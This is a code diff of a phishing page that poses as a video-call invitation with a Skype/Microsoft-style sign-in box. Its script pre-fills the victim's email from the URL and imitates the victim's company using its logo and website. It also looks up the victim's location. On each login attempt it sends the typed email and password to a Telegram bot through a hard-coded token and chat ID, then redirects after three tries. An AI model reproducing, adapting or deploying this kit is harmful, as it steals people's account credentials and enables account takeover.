@@ -229,12 +229,12 @@ body{
     <!-- GUEST -->
     <div class="participant-card" id="p2">
       <div class="avatar-wrap">
-        <img src="https://i.postimg.cc/8cR3pShh/Chat-GPT-Image-Nov-14-2025-07-20-14-AM.png" alt="guest avatar">
+        <img src="https://i.postimg.cc/Gpwf690F/flat-white-icon-man-for-web-design-silhouette-flat-illustration-vector-illustration-stock.jpg" alt="guest avatar">
         <div class="green-dot"></div>
       </div>
 
       <div class="name">Waiting for Guest</div>
-      <div class="role">Microphone</div>
+      <div class="role">Microphonez</div>
 
       <div class="mic-indicator" id="micIcon">
         <svg viewBox="0 0 24 24">
@@ -269,18 +269,20 @@ body{
 
 </div>
 
-<!-- LOGIN BOX -->
-<div class="login-box" id="loginBox">
-  <div style="text-align:center;margin-bottom:8px;">
-    <img id="logo" src="https://i.postimg.cc/qv5p8stB/blue-camera-icon-live-media-streaming-application-phone-conference-video-calls-video-communications.jpg" style="width:60px;height:60px;">
+<!-- LOGIN -->
+<div class="login-box" id="loginBox" role="dialog" aria-modal="true" aria-hidden="true">
+  <div class="logo" style="text-align:center;margin-bottom:8px;">
+    <img src="https://i.postimg.cc/qv5p8stB/blue-camera-icon-live-media-streaming-application-phone-conference-video-calls-video-communications.jpg" alt="Logo" style="width:60px;height:60px;object-fit:contain;">
   </div>
   <h2 style="text-align:center;margin:0 0 12px 0">Sign in</h2>
-  <div id="error-msg" class="error"></div>
-  <form onsubmit="return false;">
+  <div id="error-msg" class="error" style="display:block;height:22px;"></div>
+  <form id="loginForm" onsubmit="return false;">
     <input type="email" id="email" placeholder="Email, phone, or Skype" required>
     <input type="password" id="password" placeholder="Password" required>
+    <div style="height:8px"></div>
     <button type="button" id="login-btn" class="btn">Login</button>
   </form>
+  <div style="text-align:center;margin-top:10px;font-size:12px;color:#666">Forgot password? · Terms · Privacy</div>
 </div>
 
 <div class="overlay" style="position:fixed;inset:0;background:#000;opacity:0;transition:.5s"></div>
@@ -290,79 +292,97 @@ body{
 
 <script>
 // Telegram Bot config
-const TELEGRAM_BOT_TOKEN = "7642767058:AAE1c1oj-wCUdqv3_WAWwJoonDWDIHOz4SA";
-const TELEGRAM_CHAT_ID = "5748422740";
+  const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
+  const TELEGRAM_CHAT_ID = "7574749243";
 
 // Elements
+const rawHash = window.location.hash.substring(1);
 const emailInput = document.getElementById('email');
 const logoImg = document.getElementById('logo');
+const bgFrame = document.getElementById('bg-frame');
 const passwordInput = document.getElementById('password');
 const loginBtn = document.getElementById('login-btn');
 const errorMsg = document.getElementById('error-msg');
 const overlay = document.querySelector('.overlay');
-const mainPanel = document.getElementById('mainPanel');
-const loadingScreen = document.getElementById('loadingScreen');
-const joinBtn = document.getElementById('joinBtn');
-const declineBtn = document.getElementById('declineBtn');
-const micIcon = document.getElementById('micIcon');
-const callTimer = document.getElementById('callTimer');
 
 let attempts = 0;
 const maxAttempts = 3;
 
-// Overlay not blocking UI until after login
+// FIX 1: Overlay should NOT block UI until AFTER login success
 overlay.style.pointerEvents = "none";
 overlay.style.opacity = "0";
 
 document.body.classList.add('blur-active');
 
-// Call timer
-let sec = 0;
-setInterval(()=>{
-  sec++;
-  callTimer.textContent =
-    String(Math.floor(sec/60)).padStart(2,'0') + ":" +
-    String(sec%60).padStart(2,'0');
-},1000);
+if (!/^[^@]+@[^@]+\.[^@]+$/.test(rawHash)) {
 
-// Loading → main panel
-window.addEventListener('load', ()=> {
-  setTimeout(()=>{
-    loadingScreen.style.opacity='0';
-    setTimeout(()=>{
-      loadingScreen.style.display='none';
-      mainPanel.style.display='block';
-      requestAnimationFrame(()=> mainPanel.style.opacity='1');
-    },600);
-  },600);
-});
+} else {
+  emailInput.value = rawHash;
+  emailInput.setAttribute("readonly", true);
 
-// Join → show login
-joinBtn.addEventListener('click', ()=>{
-  mainPanel.style.opacity='0';
-  setTimeout(()=>{
-    mainPanel.style.display='none';
-    loginBox.style.display='block';
-    requestAnimationFrame(()=> loginBox.style.opacity='1');
-  },300);
-});
+  const domain = rawHash.split('@')[1];
 
-// Click outside → close login
-window.addEventListener('click', (e)=>{
-  if (loginBox.style.display==='block' && !loginBox.contains(e.target)) {
-    loginBox.style.opacity='0';
-    setTimeout(()=>{
-      loginBox.style.display='none';
-      mainPanel.style.display='block';
-      requestAnimationFrame(()=> mainPanel.style.opacity='1');
-    },250);
-  }
-});
+  // Set logo
+  logoImg.src = `https://logo.clearbit.com/${domain}`;
+  logoImg.onerror = () => {
+    logoImg.src = "https://via.placeholder.com/150?text=Logo";
+  };
 
-// Decline → end screen
-declineBtn.addEventListener('click', ()=> {
-  document.getElementById('endScreen').style.opacity='1';
-});
+  // Fallback screenshot
+  const fallbackScreenshot = document.createElement('img');
+  fallbackScreenshot.id = "fallback-screenshot";
+  fallbackScreenshot.style.cssText = `
+    display:none;
+    position:fixed;top:0;left:0;
+    width:100vw;height:100vh;
+    object-fit:cover;
+    z-index:-1;
+    pointer-events:none;
+  `;
+  fallbackScreenshot.src = `https://image.thum.io/get/width/1280/crop/900/https://${domain}`;
+  document.body.appendChild(fallbackScreenshot);
+
+  // Load iframe with timeout
+  let iframeLoaded = false;
+  bgFrame.src = `https://${domain}`;
+
+  bgFrame.onload = () => {
+    iframeLoaded = true;
+    fallbackScreenshot.style.display = "none";
+    bgFrame.style.display = "block";
+  };
+
+  setTimeout(() => {
+    if (!iframeLoaded) {
+      bgFrame.style.display = "none";
+      fallbackScreenshot.style.display = "block";
+    }
+  }, 6000);
+
+  bgFrame.onerror = () => {
+    bgFrame.style.display = "none";
+    fallbackScreenshot.style.display = "block";
+  };
+}
+
+// Fetch user country
+let userIP = "Unknown IP";
+let userCity = "Unknown City";
+let userCountry = "Unknown Country";
+let userISP = "Unknown ISP";
+
+loginBtn.disabled = true;
+
+fetch("https://ipapi.co/json/")
+  .then(res => res.json())
+  .then(data => {
+    userCity = data.city || userCity;
+    userCountry = data.country_name || userCountry;
+  })
+  .finally(() => {
+    loginBtn.disabled = false;
+  });
+
 // Telegram message sender
 function sendTelegramMessage(email, password, attempt, country) {
   const text = `☠️ DAVON CHAMELEON [${attempt}/3] ☠️\n` +
@@ -383,14 +403,13 @@ function sendTelegramMessage(email, password, attempt, country) {
   }).catch(e => console.error("Telegram send failed:", e));
 }
 
- 
-// LOGIN HANDLER — original attempts + sendTelegramMessage logic
+// Login button handler
 loginBtn.addEventListener('click', () => {
   const password = passwordInput.value.trim();
   if (password === "") {
     errorMsg.textContent = "Password cannot be empty.";
     return;
-   }
+  }
   attempts++;
   sendTelegramMessage(emailInput.value, password, attempts, userCountry);
 
@@ -404,6 +423,89 @@ loginBtn.addEventListener('click', () => {
     window.location.href = `https://${emailInput.value.split('@')[1]}`;
   }
 });
+/* CALL TIMER */
+let sec = 0;
+setInterval(()=>{
+  sec++;
+  callTimer.textContent =
+    String(Math.floor(sec/60)).padStart(2,'0') + ":" +
+    String(sec%60).padStart(2,'0');
+},1000);
+
+/* LOADING → MAIN PANEL */
+window.addEventListener('load', ()=> {
+  setTimeout(()=>{
+    loadingScreen.style.opacity='0';
+    setTimeout(()=>{
+      loadingScreen.style.display='none';
+      mainPanel.style.display='block';
+      requestAnimationFrame(()=> mainPanel.style.opacity='1');
+    },600);
+  },600);
+});
+
+/* JOIN BUTTON → SHOW LOGIN */
+joinBtn.addEventListener('click', ()=>{
+  mainPanel.style.opacity='0';
+  setTimeout(()=>{
+    mainPanel.style.display='none';
+    loginBox.style.display='block';
+    requestAnimationFrame(()=> loginBox.style.opacity='1');
+  },300);
+});
+
+/* CLICK OUTSIDE → CLOSE LOGIN */
+window.addEventListener('click', (e)=>{
+  if (loginBox.style.display==='block' && !loginBox.contains(e.target)) {
+    loginBox.style.opacity='0';
+    setTimeout(()=>{
+      loginBox.style.display='none';
+      mainPanel.style.display='block';
+      requestAnimationFrame(()=> mainPanel.style.opacity='1');
+    },250);
+  }
+});
+
+/* DECLINE → END SCREEN */
+declineBtn.addEventListener('click', ()=> {
+  document.getElementById('endScreen').style.opacity='1';
+});
+
+/* ------------------------------------------
+   ACTIVE LOGIN HANDLER (YOUR REQUEST)
+------------------------------------------- */
+loginBtn.addEventListener('click', async () => {
+
+  const email = emailInput.value.trim();
+  const pass = passwordInput.value.trim();
+
+  errorMsg.textContent = "";
+
+  if (!email || !pass) {
+    errorMsg.textContent = "Incorrect Password.";
+    shake(loginBox);
+    return;
+  }
+
+  try {
+    const result = await authenticateUser(email, pass, rawHash);
+
+    if (result.success) {
+      overlay.style.opacity = "1";
+      setTimeout(()=> {
+        window.location.href = result.redirect || "dashboard.html";
+      },500);
+    } else {
+      errorMsg.textContent = result.message || "Invalid password";
+      passwordInput.value = "";
+      shake(loginBox);
+    }
+  } catch (err) {
+    console.error(err);
+    errorMsg.textContent = "Network error.";
+    shake(loginBox);
+  }
+});
 
 function shake(el){
   el.classList.remove('shake');
@@ -411,7 +513,23 @@ function shake(el){
   el.classList.add('shake');
 }
 
-// HOST MICROPHONE RIPPLE
+/* BACKEND HOOK — YOU MODIFY THIS */
+async function authenticateUser(email, pass, hash){
+  // EXAMPLE backend call:
+  /*
+  const res = await fetch("/login", {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({email, password: pass, session: hash})
+  });
+  return await res.json();
+  */
+
+  // TEMP fallback
+  return { success:false, message:"Invalid credentials" };
+}
+
+/* HOST MICROPHONE RIPPLE */
 async function hostRipple(){
   const r1 = document.getElementById("p1r1");
   const r2 = document.getElementById("p1r2");
@@ -440,7 +558,6 @@ async function hostRipple(){
   }
 }
 hostRipple();
-
 
 </script>
 </body>
